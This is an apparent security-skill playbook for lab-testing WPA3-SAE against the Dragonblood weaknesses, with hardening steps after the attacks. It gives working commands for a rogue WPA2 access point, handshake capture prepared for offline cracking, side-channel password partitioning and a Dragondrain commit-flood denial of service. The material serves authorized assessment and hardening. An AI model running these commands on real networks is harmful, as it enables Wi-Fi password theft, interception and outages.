---
name: attacking-wpa3-sae-with-dragonblood
description: Assess WPA3-SAE (Dragonfly handshake) weaknesses including the Dragonblood downgrade-to-WPA2 and group-downgrade attacks, timing and cache-based side-channel password partitioning, and SAE denial-of-service (Dragondrain), then validate hardening such as disabling transition mode, requiring PMF, and enabling Hash-to-Element.
domain: cybersecurity
subdomain: wireless-security
tags:
- wireless-security
- wpa3
- sae
- dragonblood
- dragonfly-handshake
- side-channel
- pmf
- hash-to-element
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.AA-03
- PR.DS-02
- DE.CM-01
- ID.RA-01
mitre_attack:
- T1557
- T1040
- T1110
- T1499
---
# Attacking WPA3-SAE with Dragonblood

> **Authorized Use Only:** The downgrade, side-channel, and denial-of-service techniques described here transmit and capture on regulated radio spectrum and degrade live networks. Use them only against access points and client devices you own or are explicitly authorized in writing to assess. Forcing a WPA3 client onto WPA2, partitioning a passphrase, or flooding an AP's SAE state machine against networks you do not control may violate computer-misuse, wiretap, and telecommunications law.

## Overview

WPA3-Personal replaced the WPA2 four-way handshake and its offline-crackable PSK with **SAE** (Simultaneous Authentication of Equals), a password-authenticated key exchange built on the **Dragonfly** handshake (RFC 7664). SAE is designed to be resistant to offline dictionary attacks: an attacker who captures the handshake cannot test passwords offline because each guess requires an interactive exchange with the AP. In 2019 Vanhoef and Ronen published **Dragonblood** (CVE-2019-9494 through CVE-2019-9499), a set of design and implementation flaws that undermine these guarantees. Capturing and relaying the handshake frames is **Adversary-in-the-Middle (T1557)** and **Network Sniffing (T1040)**, while the resulting offline password recovery is **Brute Force (T1110)**.

The Dragonblood family includes: a **downgrade attack** against WPA3-transition mode, where an attacker running a rogue AP that advertises only WPA2 forces a dual-mode client to complete a WPA2 four-way handshake whose partial frames can then be cracked offline; a **security-group downgrade** that forces SAE to negotiate a weaker elliptic curve; and two **side-channel password-partitioning attacks**. The original Dragonfly "hunting-and-pecking" method of deriving the password element (PWE) branched on secret data, leaking information through **timing** (against MODP groups) and **cache-access patterns** (Flush+Reload against EC groups). An attacker measures these leaks across many SAE attempts, partitions the password space, and runs an offline dictionary attack at a fraction of the normal cost. Finally, **Dragondrain** is a resource-exhaustion **Endpoint Denial of Service (T1499)**: SAE's commit phase forces the AP to perform expensive quadratic-residue/curve computations, so a flood of spoofed commit frames can exhaust an AP's CPU.

The durable fix is **Hash-to-Element (H2E)**, a constant-time PWE derivation standardized by the Wi-Fi Alliance that eliminates the secret-dependent branching exploited by the side channels, combined with **disabling transition mode** (run WPA3-only where possible) and **requiring Protected Management Frames (PMF / 802.11w)**, which blocks the deauthentication and forced-reconnect primitives that make downgrade and DoS practical. This skill walks through reproducing each weakness in a lab and then proving the hardening closes it.

## When to Use

- When validating a WPA3-Personal deployment before or after go-live, especially one running WPA3/WPA2 transition mode.
- When verifying that an AP and its clients negotiate Hash-to-Element rather than legacy hunting-and-pecking PWE derivation.
- When confirming Protected Management Frames are set to *required* (not merely *capable*) on both AP and clients.
- When red-teaming a campus or enterprise guest network that advertises WPA3 support.
- When triaging a vendor firmware for the Dragonblood CVEs (CVE-2019-9494..9499) or their later variants.
- When measuring an AP's resilience to SAE commit-frame floods (Dragondrain) as part of an availability assessment.

## Prerequisites

- Linux host (Kali, Parrot, or Ubuntu) with build tools.
- A Wi-Fi adapter supporting **monitor mode and frame injection** — e.g. Alfa AWUS036ACM (mt7612u), AWUS036ACH (rtl8812au), or a card on the ath9k_htc/ath10k driver.
- Core wireless stack and capture tools:
  ```bash
  sudo apt update
  sudo apt install -y aircrack-ng hostapd wpasupplicant tshark iw libpcap-dev \
                      build-essential libssl-dev pkg-config python3-pip
  # hcxdumptool / hcxtools for capturing and converting SAE/PMKID material
  sudo apt install -y hcxdumptool hcxtools
  ```
- The Dragonblood test tools (downgrade, side-channel, and DoS PoCs):
  ```bash
  git clone https://github.com/vanhoefm/dragonblood-tools.git
  # dragonslayer (downgrade/EAP-pwd), dragondrain (DoS), dragontime / dragonforce (side-channel)
  git clone https://github.com/vanhoefm/dragondrain-and-time.git
  ```
- A dedicated test AP and at least one test client you control. Written authorization for any equipment you do not own.

## Objectives

- Enumerate the AKM suites (SAE, PSK, SAE-FT) and PMF posture advertised by a target AP.
- Detect WPA3/WPA2 transition mode and demonstrate a downgrade-to-WPA2 capture on a willing client.
- Identify whether PWE derivation uses Hash-to-Element or legacy hunting-and-pecking.
- Reproduce a timing/cache side-channel measurement against a hunting-and-pecking AP in the lab.
- Demonstrate (and measure the impact of) a Dragondrain SAE commit flood, then confirm PMF/rate-limiting mitigates it.
- Validate hardened configuration: WPA3-only, PMF required, H2E enabled.

## MITRE ATT&CK Mapping

| ID | Name | Tactic | Where it shows up |
|----|------|--------|-------------------|
| T1557 | Adversary-in-the-Middle | Credential Access / Collection | Rogue WPA2-only AP forcing transition-mode downgrade; relaying SAE/handshake frames |
| T1040 | Network Sniffing | Discovery / Credential Access | Monitor-mode capture of beacons, SAE commit/confirm, and WPA2 handshake frames |
| T1110 | Brute Force | Credential Access | Offline dictionary attack on downgraded WPA2 handshake or side-channel-partitioned password space |
| T1499 | Endpoint Denial of Service | Impact | Dragondrain SAE commit flood exhausting the AP's handshake-processing CPU |

## Workflow

### 1. Enumerate the target's AKM and PMF posture
Put the adapter in monitor mode and capture beacons/probe responses to read the RSN information element. The AKM suite selectors tell you whether SAE (00-0F-AC:8), PSK (00-0F-AC:2), or SAE-FT (00-0F-AC:9) are offered; the RSN Capabilities field's MFPC/MFPR bits tell you whether PMF is capable vs. required.

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0            # creates wlan0mon
# Capture beacons from the target channel
sudo airodump-ng -c 36 --bssid AA:BB:CC:DD:EE:FF -w wpa3scan wlan0mon
# Inspect the RSN IE / AKM / PMF bits in detail
tshark -r wpa3scan-01.cap -Y "wlan.fc.type_subtype==0x08" \
  -T fields -e wlan.ssid -e wlan.rsn.akms.type \
  -e wlan.rsn.capabilities.mfpr -e wlan.rsn.capabilities.mfpc | sort -u
```

### 2. Detect transition mode and attempt a downgrade capture
If a single SSID advertises both SAE and PSK AKMs (or a paired WPA2 BSSID exists), the network is in transition mode and a downgrade is possible. Stand up a rogue AP that advertises **only WPA2-PSK** with the same SSID; a transition-capable client that connects performs a WPA2 four-way handshake whose M1/M2 you capture for offline cracking.

```bash
# Minimal WPA2-only rogue AP (same SSID as the WPA3 target)
cat > rogue-wpa2.conf <<'EOF'
interface=wlan1
driver=nl80211
ssid=CorpWiFi
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=placeholder-not-the-real-one
EOF
sudo hostapd rogue-wpa2.conf
# In parallel, capture the downgraded handshake from a connecting test client
sudo hcxdumptool -i wlan0mon -o downgrade.pcapng --enable_status=1
hcxpcapngtool -o downgrade.hc22000 downgrade.pcapng   # WPA2 handshake for hashcat -m 22000
```

### 3. Determine PWE derivation: Hash-to-Element vs hunting-and-pecking
H2E negotiation is signalled by the **SAE-PK / H2E status code (126)** and the RSN Extension element advertising the SAE H2E-only capability. Inspect the SAE commit frames: H2E commits carry the password-identifier/anti-clogging structure of the newer method, while pure hunting-and-pecking is the legacy, side-channel-vulnerable path.

```bash
# Look at SAE authentication (Auth algorithm = 3) commit/confirm frames
tshark -r wpa3scan-01.cap -Y "wlan.fixed.auth.alg==3" \
  -T fields -e wlan.fixed.auth_seq -e wlan.fixed.status_code \
  -e wlan.fixed.finite_cyclic_group
# status_code 126 in the exchange => H2E in use (good).
# Use the companion script to summarise AKM/PMF/H2E posture:
python3 scripts/agent.py analyze --scan wpa3scan-01.cap --json findings.json
```

### 4. Reproduce a side-channel password partitioning measurement (lab only)
Against a hunting-and-pecking AP, `dragontime` measures the per-attempt timing variation tied to the secret PWE derivation, and `dragonforce` consumes the leaked timing/cache information to prune the password search. This is a measurement exercise on a known test passphrase — the goal is to show the leak exists and then prove H2E removes it.

```bash
cd dragondrain-and-time/dragontime
make
# Collect timing samples of the SAE commit response for a chosen MODP/EC group
sudo ./dragontime -i wlan1 -a AA:BB:CC:DD:EE:FF -g 22   # MODP group 22 (vulnerable)
# Feed measurements into the partitioning/dictionary stage
python3 ../../dragonblood-tools/dragonforce/dragonforce.py \
        --measurements timing.csv --wordlist rockyou.txt
```

### 5. Measure SAE DoS resilience with Dragondrain
SAE's commit processing is computationally expensive, so flooding spoofed commit frames can exhaust the AP. Send a controlled burst and watch the AP's CPU/association success rate. This proves the availability risk and gives you a baseline to test rate-limiting and anti-clogging-token mitigations against.

```bash
cd dragondrain-and-time/dragondrain
make
# Flood SAE commit frames at the target AP (controlled rate for a lab)
sudo ./dragondrain -i wlan1 -d AA:BB:CC:DD:EE:FF -r 70 -p 0
#  -r = commits/sec,  monitor AP CPU + whether a legit client can still associate
# Confirm anti-clogging tokens + PMF + commit rate-limiting restore availability.
```

### 6. Apply and validate hardening, then re-test
Reconfigure the AP to WPA3-only with PMF required and H2E, and re-run steps 1-5 to confirm transition mode is gone, PWE is constant-time, and the DoS is mitigated.

```bash
cat > wpa3-hardened.conf <<'EOF'
interface=wlan1
ssid=CorpWiFi
hw_mode=a
channel=36
wpa=2
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
ieee80211w=2          # PMF REQUIRED (not 1=capable)
sae_pwe=1             # 1 = Hash-to-Element only (2 = both; 0 = legacy H&P)
sae_require_mfp=1
disable_pmksa_caching=0
EOF
sudo hostapd wpa3-hardened.conf
# Re-run step 1/3: AKM must be SAE only, MFPR=1, SAE status_code 126 (H2E).
```

## Tools and Resources

| Resource | Link |
|----------|------|
| Dragonblood paper & disclosure (Vanhoef & Ronen) | https://wpa3.mathyvanhoef.com/ |
| dragonblood-tools (dragonslayer / dragonforce) | https://github.com/vanhoefm/dragonblood-tools |
| dragondrain-and-time (DoS + timing) | https://github.com/vanhoefm/dragondrain-and-time |
| hostap (hostapd / wpa_supplicant) | https://w1.fi/hostapd/ |
| hcxdumptool / hcxtools | https://github.com/ZerBea/hcxdumptool |
| Aircrack-ng suite | https://www.aircrack-ng.org/ |
| Wi-Fi Alliance WPA3 specification | https://www.wi-fi.org/discover-wi-fi/security |
| RFC 7664 — Dragonfly Key Exchange | https://www.rfc-editor.org/rfc/rfc7664 |

## Dragonblood Weakness Cheat-Sheet

| Weakness | CVE / mechanism | Signal | Mitigation |
|----------|-----------------|--------|------------|
| Transition-mode downgrade | CVE-2019-9494 (logic) | SSID offers SAE + PSK; paired WPA2 BSSID | WPA3-only, PMF required |
| Group downgrade | SAE security-group negotiation | Client accepts forced weak group | Restrict allowed groups; PMF |
| Timing side channel | CVE-2019-9494 (MODP groups) | Per-attempt timing varies with PWE | Hash-to-Element (sae_pwe=1) |
| Cache side channel | CVE-2019-9494 (Flush+Reload, EC) | Cache-access pattern leaks PWE branch | Hash-to-Element; constant-time PWE |
| EAP-pwd reflection/auth | CVE-2019-9497..9499 | hostapd/wpa_supplicant EAP-pwd | Patch hostap; validate scalars |
| SAE commit DoS | Dragondrain (T1499) | AP CPU spike on commit flood | Anti-clogging tokens, rate-limit, PMF |

## Validation Criteria

- [ ] AKM suites and PMF (MFPC/MFPR) of the target AP enumerated from the RSN IE.
- [ ] Transition mode presence determined; downgrade-to-WPA2 demonstrated or ruled out on a test client.
- [ ] PWE derivation method (H2E vs hunting-and-pecking) confirmed from SAE commit status codes.
- [ ] Side-channel timing measurement reproduced against a legacy-PWE lab AP (and absent under H2E).
- [ ] Dragondrain commit flood run in the lab with AP CPU/availability impact measured.
- [ ] Hardened config (WPA3-only, ieee80211w=2, sae_pwe=1) applied and re-tested.
- [ ] Findings, CVEs, and remediation status documented for the asset owner.
